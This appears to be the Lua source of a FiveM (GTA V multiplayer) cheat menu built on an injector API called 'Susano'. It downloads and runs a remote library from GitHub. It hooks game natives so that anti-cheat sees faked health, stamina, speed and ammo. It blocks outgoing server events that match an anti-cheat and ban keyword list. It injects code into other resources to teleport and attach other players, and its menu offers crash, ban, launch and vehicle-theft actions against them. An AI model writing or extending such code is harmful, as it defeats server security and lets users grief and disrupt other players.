-- ============================================
-- LIBRARY SOURCE
-- ============================================
-- Put your own raw URL here if you host library.lua yourself, for example:
--   local MyLibraryURL = "https://raw.githubusercontent.com/you/repo/main/library.lua"
-- It is tried first. If it fails (HTTP error, HTML page instead of raw Lua,
-- compile error), the next entry is tried, so the menu still starts.
local MyLibraryURL = nil

local LibraryURLs = {}

if type(MyLibraryURL) == "string" and #MyLibraryURL > 0 then
    LibraryURLs[#LibraryURLs + 1] = MyLibraryURL
end

LibraryURLs[#LibraryURLs + 1] = "https://raw.githubusercontent.com/BUSDANSTETE/lua/main/library.lua"

local LibraryCode = nil
local LastError = "no source"

for i = 1, #LibraryURLs do
    local url = LibraryURLs[i]
    local called, httpStatus, body = pcall(Susano.HttpGet, url)

    if not called then
        LastError = "HttpGet unavailable: " .. tostring(httpStatus)
        print("[Menu] " .. LastError)
    elseif httpStatus ~= 200 then
        LastError = ("HTTP %s on %s"):format(tostring(httpStatus), url)
        print("[Menu] " .. LastError)
    elseif type(body) ~= "string" or #body < 1000 then
        LastError = ("empty body (%s bytes) from %s"):format(tostring(body and #body), url)
        print("[Menu] " .. LastError)
    else
        body = string.gsub(body, "^\239\187\191", "")

        local testChunk, testErr = load(body)
        local looksLikeLibrary = string.find(body, "Menu.ItemsPerPage", 1, true)
            or string.find(body, "Menu.DrawItem", 1, true)

        if testChunk and looksLikeLibrary then
            LibraryCode = body
            print(("[Menu] library OK: %s (%d bytes)"):format(url, #body))
            break
        elseif not testChunk then
            LastError = ("compile error from %s: %s"):format(url, tostring(testErr))
            print("[Menu] " .. LastError)
        else
            LastError = ("not the menu library: %s"):format(url)
            print("[Menu] " .. LastError)
        end
    end
end

if not LibraryCode then
    print("[Menu] no usable library: " .. LastError)

    -- Show the reason on screen instead of dying silently.
    if type(Susano) == "table" and Susano.BeginFrame and Susano.DrawText then
        CreateThread(function()
            while true do
                Wait(0)
                Susano.BeginFrame()
                Susano.DrawRectFilled(40, 40, 780, 66, 0.05, 0.05, 0.06, 0.92, 6)
                Susano.DrawText(56, 56, "[Menu] library not loaded", 18, 1.0, 0.28, 0.28, 1.0)
                Susano.DrawText(56, 78, tostring(LastError):sub(1, 110), 14, 0.95, 0.95, 0.95, 1.0)
                Susano.SubmitFrame()
            end
        end)
    end

    return
end

-- Patch OnRender
if not string.find(LibraryCode, "Menu.OnRender") then
    LibraryCode = string.gsub(LibraryCode, "if Susano%.SubmitFrame then", [[
    if Menu.OnRender then
        local success, err = pcall(Menu.OnRender)
        if not success then end
    end
    if Susano.SubmitFrame then]])
end

-- Patch ResetFrame
if string.find(LibraryCode, "Susano%.ResetFrame") then
    LibraryCode = string.gsub(LibraryCode, "if Susano%.ResetFrame then", "if Susano.ResetFrame and not Menu.PreventResetFrame then")
end

-- Strip \r from HTTP content for consistent pattern matching
LibraryCode = string.gsub(LibraryCode, "\r", "")

-- Patch tag display [RISK] (red) / [DYNASTY] (purple) / [SEED] (green)
LibraryCode = string.gsub(
    LibraryCode,
    'Menu%.DrawText%(textX, textY, item%.name, 19, Menu%.Colors%.TextWhite%.r / 255%.0, Menu%.Colors%.TextWhite%.g / 255%.0, Menu%.Colors%.TextWhite%.b / 255%.0, 1%.0%)',
    'Menu.DrawText(textX, textY, item.name, 19, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0); if (item.risk or item.dynasty or item.seed) and Susano and Susano.GetTextWidth then local _sc = 19 * (Menu.Scale or 1.0); local _ox = Susano.GetTextWidth(item.name, _sc); if item.risk then Menu.DrawText(textX + _ox, textY, "  [RISK]", 19, 1.0, 0.15, 0.15, 1.0); _ox = _ox + Susano.GetTextWidth("  [RISK]", _sc) end; if item.dynasty then Menu.DrawText(textX + _ox, textY, "  [DYNASTY]", 19, 0.6, 0.2, 1.0, 1.0); _ox = _ox + Susano.GetTextWidth("  [DYNASTY]", _sc) end; if item.seed then Menu.DrawText(textX + _ox, textY, "  [SEED]", 19, 0.2, 1.0, 0.35, 1.0) end end'
)

-- ============================================
-- PATCH: Category icon image + bold text shadow
-- ============================================
-- Replaces category name rendering to:
--   1. Draw icon texture (from iconUrl) left of text
--   2. Add 1px shadow for bold effect
--   3. Shift text right to make room for icon
LibraryCode = string.gsub(
    LibraryCode,
    'Menu%.DrawText%(textX, textY, category%.name, 19, Menu%.Colors%.TextWhite%.r / 255%.0, Menu%.Colors%.TextWhite%.g / 255%.0, Menu%.Colors%.TextWhite%.b / 255%.0, 1%.0%)',
    [[do
                local _iSz = itemHeight * 0.4
                local _iOk = false
                if category.iconUrl and Menu.IconTextures and Menu.IconTextures[category.name] then
                    local _t = Menu.IconTextures[category.name]
                    if _t and _t > 0 and Susano and Susano.DrawImage then
                        Susano.DrawImage(_t, x + 14, itemY + (itemHeight - _iSz) / 2, _iSz, _iSz, 1, 1, 1, 1, 0)
                        _iOk = true
                    end
                end
                local _offX = _iOk and (14 + _iSz + 8) or 16
                textX = x + _offX
                local _wr = Menu.Colors.TextWhite.r / 255.0
                local _wg = Menu.Colors.TextWhite.g / 255.0
                local _wb = Menu.Colors.TextWhite.b / 255.0
                Menu.DrawText(textX, textY, category.name, 19, _wr, _wg, _wb, 1.0)
            end]]
)

-- Chevron now uses image icon (embedded directly in library.lua)

-- ============================================
-- PATCH: Footer text + centered logo image
-- Footer text + logo are now embedded directly in library.lua

local chunk, err = load(LibraryCode)
if not chunk then
    print("[Menu] Erreur compilation: " .. tostring(err))
    return
end

local Menu = chunk()

-- ============================================
-- BOLD TEXT: Override DrawText with shadow pass
-- ============================================
-- Wraps Menu.DrawText to always draw a 1px dark shadow behind text
-- This simulates bold/weight since Susano has no font-weight API
Menu._OrigDrawText = Menu.DrawText
Menu.BoldText = false -- bold disabled for cleaner readability

function Menu.DrawText(x, y, text, size_px, r, g, b, a)
    if Menu.BoldText and a and a > 0.1 then
        -- Shadow pass: 1px right, black, 30% of original alpha
        Menu._OrigDrawText(x + 1, y, text, size_px, 0, 0, 0, (a or 1.0) * 0.3)
    end
    Menu._OrigDrawText(x, y, text, size_px, r, g, b, a)
end

-- ============================================
-- ICON TEXTURE SYSTEM
-- ============================================
-- Cache for category icon textures loaded from URLs
Menu.IconTextures = {}
Menu.FooterLogoTex = nil
Menu.FooterText = "" -- <<< CHANGE THIS to your menu name

-- Footer logo URL (small square image, ideally 64x64 or 128x128 PNG)
Menu.FooterLogoUrl = "https://i.imgur.com/jY5oSqw.png" -- <<< REPLACE with your logo URL

Menu.ArrowUpUrl = "https://i.imgur.com/CefzPfK.png"
Menu.ArrowDownUrl = "https://i.imgur.com/cEtkALw.png"
Menu.ChevronUrl = "https://i.imgur.com/qPVyVP3.png"

-- Load a single icon texture from URL, store in Menu.IconTextures[name]
function Menu.LoadIconTexture(name, url)
    if not url or url == "" then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end
    if Menu.IconTextures[name] and Menu.IconTextures[name] > 0 then return end -- already loaded

    CreateThread(function()
        local ok, result = pcall(function()
            local status, body = Susano.HttpGet(url)
            if status == 200 and body and #body > 100 then
                local texId, w, h = Susano.LoadTextureFromBuffer(body)
                if texId and texId ~= 0 then
                    Menu.IconTextures[name] = texId
                    print("[Icons] Loaded: " .. name .. " (tex=" .. tostring(texId) .. ")")
                end
            else
                print("[Icons] HTTP " .. tostring(status) .. " for " .. name)
            end
        end)
        if not ok then
            print("[Icons] Error loading " .. name .. ": " .. tostring(result))
        end
    end)
end

-- Load footer logo texture
function Menu.LoadFooterLogo(url)
    if not url or url == "" or url:find("PLACEHOLDER") then return end
    if not Susano or not Susano.HttpGet or not Susano.LoadTextureFromBuffer then return end

    CreateThread(function()
        local ok, result = pcall(function()
            local status, body = Susano.HttpGet(url)
            if status == 200 and body and #body > 100 then
                local texId, w, h = Susano.LoadTextureFromBuffer(body)
                if texId and texId ~= 0 then
                    Menu.FooterLogoTex = texId
                    print("[Footer] Logo loaded (tex=" .. tostring(texId) .. ")")
                end
            end
        end)
    end)
end

-- Init: load all icon textures at startup
function Menu.LoadAllIcons()
    if not Menu.Categories then return end
    for _, cat in ipairs(Menu.Categories) do
        if cat.iconUrl and cat.iconUrl ~= "" and not cat.iconUrl:find("PLACEHOLDER") then
            Menu.LoadIconTexture(cat.name, cat.iconUrl)
        end
    end
    Menu.LoadFooterLogo(Menu.FooterLogoUrl)
    if Menu.ArrowUpUrl and Menu.ArrowUpUrl ~= "" then
        Menu.LoadIconTexture("_arrowUp", Menu.ArrowUpUrl)
    end
    if Menu.ArrowDownUrl and Menu.ArrowDownUrl ~= "" then
        Menu.LoadIconTexture("_arrowDown", Menu.ArrowDownUrl)
    end
    if Menu.ChevronUrl and Menu.ChevronUrl ~= "" then
        Menu.LoadIconTexture("_chevron", Menu.ChevronUrl)
    end
end

Menu.DrawWatermark = function() end
Menu.UpdatePlayerCount = function() end
Menu.ShowSnowflakes = true -- sync avec Flocon value = true

-- ============================================
-- DÃ‰BUT DU CODE ORIGINAL (ligne 39 de l'ancien fichier)
-- ============================================
Menu.shooteyesEnabled = false
Menu.magicbulletEnabled = false
Menu.silentAimEnabled = false
Menu.superPunchEnabled = false
-- ... tout le reste identique
Menu.rapidFireEnabled = false
Menu.infiniteAmmoEnabled = false
Menu.noSpreadEnabled = false
Menu.noRecoilEnabled = false
Menu.noReloadEnabled = false
Menu.unlockAllVehicleEnabled = false

Menu.FOVWarp = false
Menu.WarpPressW = false

-- ============================================
-- STEALTH AUTO-SPOOF SYSTEM
-- ============================================
-- Hooks enregistrés une seule fois. Conditionnés par flags.
-- Chaque feature toggle active/désactive ses flags automatiquement.

_Stealth = {
    invincible = false,
    health = false,
    stamina = false,
    speed = false,
    ammo = false,
    blockAC = false,
    _speedUsers = 0,
    _acUsers = 0,
    _godUsers = 0,
}

local _fakeStamina = 92.0
local _fakeStaminaDir = -1
local _fakeStaminaTick = 0
local _fakeAmmo = {}

do
    if type(Susano) == "table" and type(Susano.HookNative) == "function" then

        -- GetPlayerInvincible → false
        Susano.HookNative(0xB721981B2B939E07, function(player)
            if _Stealth.invincible and player == PlayerId() then
                return false, false
            end
            return true
        end)

        -- GetEntityHealth → 190-200
        Susano.HookNative(0xEEF059FAD016D209, function(entity)
            if _Stealth.health and entity == PlayerPedId() then
                return false, 190 + math.random(0, 10)
            end
            return true
        end)

        -- GetPlayerStamina → oscillation 45-98
        Susano.HookNative(0xCEFD02E1E6BC7AF0, function(player)
            if _Stealth.stamina and player == PlayerId() then
                local now = GetGameTimer()
                if now - _fakeStaminaTick > 300 then
                    _fakeStaminaTick = now
                    _fakeStamina = _fakeStamina + (_fakeStaminaDir * math.random(2, 6))
                    if _fakeStamina < 45 then _fakeStamina = 45; _fakeStaminaDir = 1
                    elseif _fakeStamina > 98 then _fakeStamina = 98; _fakeStaminaDir = -1 end
                end
                return false, _fakeStamina
            end
            return true
        end)

        -- GetEntitySpeed → cap 6.5-8.0 m/s
        Susano.HookNative(0xD5037BA82E12416F, function(entity)
            if _Stealth.speed then
                local ped = PlayerPedId()
                if entity == ped and not IsPedInAnyVehicle(ped, false) then
                    return false, 6.5 + math.random() * 1.5
                end
            end
            return true
        end)

        -- GetAmmoInPedWeapon → fake count décroissant
        Susano.HookNative(0x015A522136D7F951, function(ped, weaponHash)
            if _Stealth.ammo and ped == PlayerPedId() then
                if not _fakeAmmo[weaponHash] then
                    _fakeAmmo[weaponHash] = 25 + math.random(0, 15)
                end
                if IsPedShooting(ped) then
                    _fakeAmmo[weaponHash] = _fakeAmmo[weaponHash] - 1
                    if _fakeAmmo[weaponHash] <= 0 then
                        _fakeAmmo[weaponHash] = 20 + math.random(0, 15)
                    end
                end
                return false, _fakeAmmo[weaponHash]
            end
            return true
        end)
    end

    -- AC event filter
    local acPatterns = {
        "anticheat","anti_cheat","anti-cheat","ac_report","ac_flag","ac_detect",
        "ac_log","ac_check","cheat_report","cheat_detect","ban_request","ban_player",
        "detection","violation","integrity","screencap","screenshot","security_check",
        "_ac_","_ban_","flagged","suspected","hacker","speed_hack","speedhack",
        "health_hack","godmode_detect","damage_log","damage_check","weapon_check",
        "aimbot","aim_bot","teleport_detect","tp_detect","noclip_detect","ammo_check",
        "ammo_hack","position_check",
    }
    if type(Susano) == "table" and type(Susano.OnTriggerServerEvent) == "function" then
        Susano.OnTriggerServerEvent(function(name, payload)
            if not _Stealth.blockAC then return name, payload end
            local lower = string.lower(name)
            for _, pat in ipairs(acPatterns) do
                if string.find(lower, pat, 1, true) then return false end
            end
            return name, payload
        end)
    end
end

local function StealthAcquire(flag)
    local key = "_" .. flag .. "Users"
    if _Stealth[key] then _Stealth[key] = _Stealth[key] + 1 end
    _Stealth[flag] = true
end

local function StealthRelease(flag)
    local key = "_" .. flag .. "Users"
    if _Stealth[key] then
        _Stealth[key] = math.max(0, _Stealth[key] - 1)
        if _Stealth[key] <= 0 then _Stealth[flag] = false end
    else
        _Stealth[flag] = false
    end
end


local foundVehicles = {}
local Actions = {}

local attachTargetActive = false
local attachTargetServerId = nil
local banPlayerActive = false
local banPlayerThread = nil
local function ToggleAttachTarget(enable)
    attachTargetActive = enable
    if not enable then
        if attachTargetServerId then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", string.format([[
                    rawset(_G, 'attach_target_loop_%d', false)
                ]], attachTargetServerId))
            end
            attachTargetServerId = nil
        end
        return
    end

    Citizen.CreateThread(function()
        local function RotationToDirection(rotation)
            local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
            local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
            return direction
        end

        while attachTargetActive do
            Citizen.Wait(100)
            if IsControlJustPressed(0, 74) then
                local success, err = pcall(function()
                    local playerPed = PlayerPedId()
                    if not DoesEntityExist(playerPed) then return end

                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vector3(camPos.x + direction.x * 1000.0, camPos.y + direction.y * 1000.0, camPos.z + direction.z * 1000.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, 10, playerPed, 0)
                    Wait(0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)

                local targetServerId = nil

                if hit == 1 and entityHit and entityHit ~= 0 and DoesEntityExist(entityHit) and IsEntityAPed(entityHit) then
                    local targetPed = entityHit

                    if targetPed == playerPed then
                        goto continue
                    end

                    for _, player in ipairs(GetActivePlayers()) do
                        local ped = GetPlayerPed(player)
                        if ped and ped ~= 0 and DoesEntityExist(ped) and ped == targetPed then
                            targetServerId = GetPlayerServerId(player)
                            break
                        end
                    end
                else
                    local closestPed = nil
                    local closestDistance = 5.0
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= PlayerId() then
                            local targetPed = GetPlayerPed(player)
                            if targetPed and targetPed ~= 0 and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                local pedCoords = GetEntityCoords(targetPed)
                                local distance = #(pedCoords - playerCoords)

                                if distance <= closestDistance and distance > 0.0 then
                                    local screenX, screenY = GetScreenCoordFromWorldCoord(pedCoords.x, pedCoords.y, pedCoords.z)
                                    if screenX >= 0.0 and screenX <= 1.0 and screenY >= 0.0 and screenY <= 1.0 then
                                        local dirToPed = pedCoords - camPos
                                        local distToPed = #dirToPed
                                        if distToPed > 0.1 then
                                            dirToPed = dirToPed / distToPed
                                            local dot = direction.x * dirToPed.x + direction.y * dirToPed.y + direction.z * dirToPed.z
                                            if dot > 0.9 then
                                                closestPed = targetPed
                                                closestDistance = distance
                                                targetServerId = GetPlayerServerId(player)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                if targetServerId then
                    if attachTargetServerId == targetServerId then
                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                rawset(_G, 'attach_target_loop_%d', false)
                            ]], targetServerId))
                        end
                        attachTargetServerId = nil
                    else
                        if attachTargetServerId then
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    rawset(_G, 'attach_target_loop_%d', false)
                                ]], attachTargetServerId))
                            end
                        end

                        attachTargetServerId = targetServerId

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                                local targetServerId = %d
                                local playerPed = PlayerPedId()

                                local targetPlayerId = nil
                                for _, player in ipairs(GetActivePlayers()) do
                                    if GetPlayerServerId(player) == targetServerId then
                                        targetPlayerId = player
                                        break
                                    end
                                end

                                if not targetPlayerId then return end
                                local targetPed = GetPlayerPed(targetPlayerId)
                                if not DoesEntityExist(targetPed) then return end

                                rawset(_G, 'attach_target_loop_' .. targetServerId, true)

                                CreateThread(function()
                                    while rawget(_G, 'attach_target_loop_' .. targetServerId) do
                                        Wait(100)

                                        local success, err = pcall(function()
                                            if not DoesEntityExist(playerPed) or not DoesEntityExist(targetPed) then
                                                rawset(_G, 'attach_target_loop_' .. targetServerId, false)
                                                return
                                            end

                                            local myCoords = GetEntityCoords(playerPed)
                                            local myForward = GetEntityForwardVector(playerPed)
                                            local myHeading = GetEntityHeading(playerPed)

                                            if myCoords and myForward then
                                                SetEntityCoordsNoOffset(targetPed, myCoords.x + myForward.x, myCoords.y + myForward.y, myCoords.z + myForward.z, true, true, true)
                                                SetEntityHeading(targetPed, myHeading)
                                            end
                                        end)

                                        if not success then
                                            rawset(_G, 'attach_target_loop_' .. targetServerId, false)
                                            break
                                        end
                                    end
                                end)
                            ]], targetServerId))
                        end
                    end
                end
                ::continue::
                end)
                if not success then
                    -- Ignore errors silently
                end
            end
        end
    end)
end

local selectedWeaponIndex = {
    melee = 1,
    pistol = 1,
    smg = 1,
    shotgun = 1,
    ar = 1,
    sniper = 1,
    heavy = 1
}

local weaponLists = {
    melee = {
        {name = "WEAPON_KNIFE", display = "Knife"},
        {name = "WEAPON_BAT", display = "Baseball Bat"},
        {name = "WEAPON_CROWBAR", display = "Crowbar"},
        {name = "WEAPON_GOLFCLUB", display = "Golf Club"},
        {name = "WEAPON_HAMMER", display = "Hammer"},
        {name = "WEAPON_HATCHET", display = "Hatchet"},
        {name = "WEAPON_KNUCKLE", display = "Brass Knuckles"},
        {name = "WEAPON_MACHETE", display = "Machete"},
        {name = "WEAPON_SWITCHBLADE", display = "Switchblade"},
        {name = "WEAPON_NIGHTSTICK", display = "Nightstick"},
        {name = "WEAPON_WRENCH", display = "Wrench"},
        {name = "WEAPON_BATTLEAXE", display = "Battle Axe"},
        {name = "WEAPON_POOLCUE", display = "Pool Cue"},
        {name = "WEAPON_STONE_HATCHET", display = "Stone Hatchet"}
    },
    pistol = {
        {name = "WEAPON_PISTOL", display = "Pistol"},
        {name = "WEAPON_PISTOL_MK2", display = "Pistol MK2"},
        {name = "WEAPON_COMBATPISTOL", display = "Combat Pistol"},
        {name = "WEAPON_PISTOL50", display = "Pistol .50"},
        {name = "WEAPON_SNSPISTOL", display = "SNS Pistol"},
        {name = "WEAPON_SNSPISTOL_MK2", display = "SNS Pistol MK2"},
        {name = "WEAPON_HEAVYPISTOL", display = "Heavy Pistol"},
        {name = "WEAPON_VINTAGEPISTOL", display = "Vintage Pistol"},
        {name = "WEAPON_FLAREGUN", display = "Flare Gun"},
        {name = "WEAPON_MARKSMANPISTOL", display = "Marksman Pistol"},
        {name = "WEAPON_REVOLVER", display = "Heavy Revolver"},
        {name = "WEAPON_REVOLVER_MK2", display = "Heavy Revolver MK2"},
        {name = "WEAPON_DOUBLEACTION", display = "Double Action Revolver"},
        {name = "WEAPON_APPISTOL", display = "AP Pistol"},
        {name = "WEAPON_STUNGUN", display = "Stun Gun"},
        {name = "WEAPON_CERAMICPISTOL", display = "Ceramic Pistol"},
        {name = "WEAPON_NAVYREVOLVER", display = "Navy Revolver"}
    },
    smg = {
        {name = "WEAPON_MICROSMG", display = "Micro SMG"},
        {name = "WEAPON_SMG", display = "SMG"},
        {name = "WEAPON_SMG_MK2", display = "SMG MK2"},
        {name = "WEAPON_ASSAULTSMG", display = "Assault SMG"},
        {name = "WEAPON_COMBATPDW", display = "Combat PDW"},
        {name = "WEAPON_MACHINEPISTOL", display = "Machine Pistol"},
        {name = "WEAPON_MINISMG", display = "Mini SMG"},
        {name = "WEAPON_GUSENBERG", display = "Gusenberg Sweeper"}
    },
    shotgun = {
        {name = "WEAPON_PUMPSHOTGUN", display = "Pump Shotgun"},
        {name = "WEAPON_PUMPSHOTGUN_MK2", display = "Pump Shotgun MK2"},
        {name = "WEAPON_SAWNOFFSHOTGUN", display = "Sawed-Off Shotgun"},
        {name = "WEAPON_ASSAULTSHOTGUN", display = "Assault Shotgun"},
        {name = "WEAPON_BULLPUPSHOTGUN", display = "Bullpup Shotgun"},
        {name = "WEAPON_MUSKET", display = "Musket"},
        {name = "WEAPON_HEAVYSHOTGUN", display = "Heavy Shotgun"},
        {name = "WEAPON_DBSHOTGUN", display = "Double Barrel Shotgun"},
        {name = "WEAPON_AUTOSHOTGUN", display = "Auto Shotgun"},
        {name = "WEAPON_COMBATSHOTGUN", display = "Combat Shotgun"}
    },
    ar = {
        {name = "WEAPON_ASSAULTRIFLE", display = "Assault Rifle"},
        {name = "WEAPON_ASSAULTRIFLE_MK2", display = "Assault Rifle MK2"},
        {name = "WEAPON_CARBINERIFLE", display = "Carbine Rifle"},
        {name = "WEAPON_CARBINERIFLE_MK2", display = "Carbine Rifle MK2"},
        {name = "WEAPON_ADVANCEDRIFLE", display = "Advanced Rifle"},
        {name = "WEAPON_SPECIALCARBINE", display = "Special Carbine"},
        {name = "WEAPON_SPECIALCARBINE_MK2", display = "Special Carbine MK2"},
        {name = "WEAPON_BULLPUPRIFLE", display = "Bullpup Rifle"},
        {name = "WEAPON_BULLPUPRIFLE_MK2", display = "Bullpup Rifle MK2"},
        {name = "WEAPON_COMPACTRIFLE", display = "Compact Rifle"},
        {name = "WEAPON_MILITARYRIFLE", display = "Military Rifle"},
        {name = "WEAPON_HEAVYRIFLE", display = "Heavy Rifle"},
        {name = "WEAPON_TACTICALRIFLE", display = "Tactical Rifle"}
    },
    sniper = {
        {name = "WEAPON_SNIPERRIFLE", display = "Sniper Rifle"},
        {name = "WEAPON_HEAVYSNIPER", display = "Heavy Sniper"},
        {name = "WEAPON_HEAVYSNIPER_MK2", display = "Heavy Sniper MK2"},
        {name = "WEAPON_MARKSMANRIFLE", display = "Marksman Rifle"},
        {name = "WEAPON_MARKSMANRIFLE_MK2", display = "Marksman Rifle MK2"},
        {name = "WEAPON_PRECISIONRIFLE", display = "Precision Rifle"}
    },
    heavy = {
        {name = "WEAPON_RPG", display = "RPG"},
        {name = "WEAPON_GRENADELAUNCHER", display = "Grenade Launcher"},
        {name = "WEAPON_GRENADELAUNCHER_SMOKE", display = "Grenade Launcher Smoke"},
        {name = "WEAPON_MINIGUN", display = "Minigun"},
        {name = "WEAPON_FIREWORK", display = "Firework Launcher"},
        {name = "WEAPON_RAILGUN", display = "Railgun"},
        {name = "WEAPON_HOMINGLAUNCHER", display = "Homing Launcher"},
        {name = "WEAPON_COMPACTLAUNCHER", display = "Compact Grenade Launcher"},
        {name = "WEAPON_RAYMINIGUN", display = "Widowmaker"},
        {name = "WEAPON_EMPLAUNCHER", display = "Compact EMP Launcher"},
        {name = "WEAPON_RAILGUNXM3", display = "Railgun XM3"}
    }
}


local function GenerateNativeHooks(nativesList)
    local hooks = [[
local function hNative(nativeName, newFunction)
    local originalNative = _G[nativeName]
    if not originalNative or type(originalNative) ~= "function" then return end
    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
end
]]
    for _, nativeName in ipairs(nativesList) do
        hooks = hooks .. string.format('hNative("%s", function(originalFn, ...) return originalFn(...) end)\n', nativeName)
    end
    return hooks
end


local COMMON_NATIVES = {
    "GetActivePlayers", "GetPlayerServerId", "GetPlayerPed", "DoesEntityExist", 
    "PlayerPedId", "GetEntityCoords", "SetEntityCoordsNoOffset", "GetEntityHeading",
    "SetEntityHeading", "IsPedInAnyVehicle", "GetVehiclePedIsIn"
}


local VEHICLE_NATIVES = {
    "TaskWarpPedIntoVehicle", "SetVehicleDoorsLocked", "SetVehicleDoorsLockedForAllPlayers",
    "IsVehicleSeatFree", "ClearPedTasksImmediately", "TaskEnterVehicle", 
    "GetClosestVehicle", "SetPedIntoVehicle", "SetEntityAsMissionEntity",
    "NetworkGetEntityIsNetworked", "NetworkRequestControlOfEntity", "AttachEntityToEntity",
    "DetachEntity", "AttachEntityToEntityPhysically", "GetOffsetFromEntityInWorldCoords",
    "SetEntityRotation", "FreezeEntityPosition", "TaskLeaveVehicle", "DeletePed",
    "GetPedInVehicleSeat", "NetworkHasControlOfEntity"
}

local function WrapWithVehicleHooks(code)
    local allNatives = {}
    for _, n in ipairs(COMMON_NATIVES) do table.insert(allNatives, n) end
    for _, n in ipairs(VEHICLE_NATIVES) do table.insert(allNatives, n) end
    return GenerateNativeHooks(allNatives) .. "\n" .. code
end

Menu.Categories = {
    { name = "Main Menu", icon = "P" },
    { name = "Player", iconUrl = "https://i.imgur.com/CI38tSd.png", icon = "ðŸ‘¤", hasTabs = true, tabs = {
        { name = "Self", items = {
            { name = "", isSeparator = true, separatorText = "Health" },
            { name = "Revive", type = "action" },
            { name = "", isSeparator = true, separatorText = "Other" },
            { name = "TP all vehicle to me", type = "action" },
            { name = "Detach All Entitys", type = "action" },
            { name = "Solo Session", type = "toggle", value = false },
            { name = "Throw Vehicle", type = "toggle", value = false },
            { name = "Tiny Player", type = "toggle", value = false },
        }},
        { name = "Wardrobe", items = {
            { name = "Random Outfit", type = "action" },
            { name = "", isSeparator = true, separatorText = "Clothing" },
            { name = "Hat", type = "selector", options = {}, selected = 1 },
            { name = "Mask", type = "selector", options = {}, selected = 1 },
            { name = "Glasses", type = "selector", options = {}, selected = 1 },
            { name = "Torso", type = "selector", options = {}, selected = 1 },
            { name = "Tshirt", type = "selector", options = {}, selected = 1 },
            { name = "Pants", type = "selector", options = {}, selected = 1 },
            { name = "Shoes", type = "selector", options = {}, selected = 1 }
        }}
    }},
    { name = "Online", iconUrl = "https://i.imgur.com/9k1REcK.png", icon = "ðŸ‘¥", hasTabs = true, tabs = {
        { name = "Player List", items = {
            { name = "Loading players...", type = "action" }
        }},
        { name = "Troll", items = {
            { name = "", isSeparator = true, separatorText = "Appearance" },
            { name = "Copy Appearance", type = "action" },
            
            { name = "", isSeparator = true, separatorText = "Attacks" },
            { name = "Ban Player [BETA]", type = "toggle", value = false, risk = true},
            { name = "Shoot Player", type = "action", risk = true},
            { name = "Ragdoll", type = "action"},
            { name = "Attach Player", type = "toggle", value = false, onClick = function(val)
                local target = Menu.SelectedPlayer
                if not target then
                    local closestDist = 5.0
                    local pCoords = GetEntityCoords(PlayerPedId())
                    for _, p in ipairs(GetActivePlayers()) do
                        if p ~= PlayerId() then
                            local pPed = GetPlayerPed(p)
                            local pDist = #(GetEntityCoords(pPed) - pCoords)
                            if pDist < closestDist then
                                closestDist = pDist
                                target = p
                            end
                        end
                    end
                end

                if target then
                    if not attachedPlayers then attachedPlayers = {} end
                    local targetPed = GetPlayerPed(target)
                    if val then
                        attachedPlayers[target] = targetPed
                    else
                        attachedPlayers[target] = nil
                    end
                end
            end },
            
            { name = "", isSeparator = true, separatorText = "Bugs" },
            { name = "Bug Player", type = "selector", options = {"Bug", "Launch", "Hard Launch", "Attach"}, selected = 1 },
            { name = "Crush", type = "selector", options = {"Rain", "Drop", "Ram"}, selected = 1 },
            { name = "Black Hole", type = "toggle", value = false },
            { name = "Crash Method", type = "action" },
            { name = "Airstrike", type = "action" },
            { name = "Assault Driver", type = "action" },
            
            { name = "", isSeparator = true, separatorText = "Props" },
            { name = "Rainbow Tube", type = "action" },
            { name = "Trapped in Tube", type = "action" },
            { name = "Attach Toilet", type = "action" },
            { name = "Clear All Attached", type = "action" },
            { name = "Delete All Tubes", type = "action" },
            
            { name = "", isSeparator = true, separatorText = "Attach Animations" },
            { name = "Twerk", type = "toggle", value = false },
            { name = "Baise", type = "toggle", value = false },
            { name = "Branlette", type = "toggle", value = false },
            { name = "PiggyBack", type = "toggle", value = false }
        }},
        { name = "Vehicle", items = {
            { name = "", isSeparator = true, separatorText = "Bugs" },
            { name = "Bug Vehicle", type = "selector", options = {"V1", "V2"}, selected = 1 },
            { name = "Warp", type = "selector", options = {"Classic", "Boost"}, selected = 1 },
            { name = "Teleport Into", type = "action" },
            
            { name = "", isSeparator = true, separatorText = "Teleportation" },
            { name = "TP to", type = "selector", options = {"ocean", "mazebank", "sandyshores"}, selected = 1 },
            
            { name = "", isSeparator = true, separatorText = "Actions" },
            { name = "Remote Vehicle", type = "action" },
            { name = "Steal Vehicle", type = "action" },
            { name = "NPC Drive", type = "action" },
            { name = "Delete Vehicle", type = "action" },
            { name = "Kick Vehicle", type = "selector", options = {"V1", "V2"}, selected = 1 },
            { name = "Remove Tires", type = "action" },
            { name = "Give", type = "selector", options = {"Vehicle", "Ramp", "Wall", "Wall 2"}, selected = 1 }
        }},
        { name = "Everyone", items = {
            { name = "Launch All", type = "action" }
        }}
    }},
    { name = "Visual", iconUrl = "https://i.imgur.com/iHvywcn.png", icon = "ðŸ‘", hasTabs = true, tabs = {
        { name = "World", items = {
            { name = "FPS Boost", type = "toggle", value = false },
            { name = "Time", type = "slider", value = 12.0, min = 0.0, max = 23.0 },
            { name = "Freeze Time", type = "toggle", value = false },
